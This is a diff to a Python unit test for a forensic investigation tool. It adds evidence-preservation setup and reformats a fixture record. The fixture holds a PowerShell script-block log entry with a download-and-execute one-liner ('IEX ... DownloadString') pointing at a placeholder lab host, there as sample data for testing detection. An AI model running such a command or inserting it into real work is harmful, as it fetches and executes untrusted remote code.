@@ -15,6 +15,8 @@ from analysis.investigation.entities import build_entity_index, pivot_entities
 from analysis.investigation.notes_service import NotesService
 from case_management.case_service import CaseService
 from common.enums import ArtifactType
+from common.json_utils import write_json
+from evidence.evidence_service import EvidenceService
 from models.normalized_record import NormalizedRecord
 
 PROJECT_ROOT = Path(__file__).resolve().parents[2]
@@ -32,6 +34,12 @@ class InvestigationTests(unittest.TestCase):
             target_hostname="WIN-LAB01",
             profile_id="general_investigation",
         )
+        paths = self.service.repository.paths(self.case.case_id)
+        write_json(
+            paths.raw / "Files" / "unit_test_input.json",
+            {"source": "synthetic unit test"},
+        )
+        EvidenceService(self.temp_path).preserve_case(self.case.case_id)
 
     def record(self, **overrides) -> NormalizedRecord:
         values = {
@@ -65,7 +73,9 @@ class InvestigationTests(unittest.TestCase):
             event_id=4104,
             record_id="REC-4104",
             summary="ScriptBlock DownloadString invoked",
-            attributes={"ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://lab')"},
+            attributes={
+                "ScriptBlockText": "IEX (New-Object Net.WebClient).DownloadString('http://lab')"
+            },
         )
         file_change = self.record(
             artifact_type=ArtifactType.FILES,
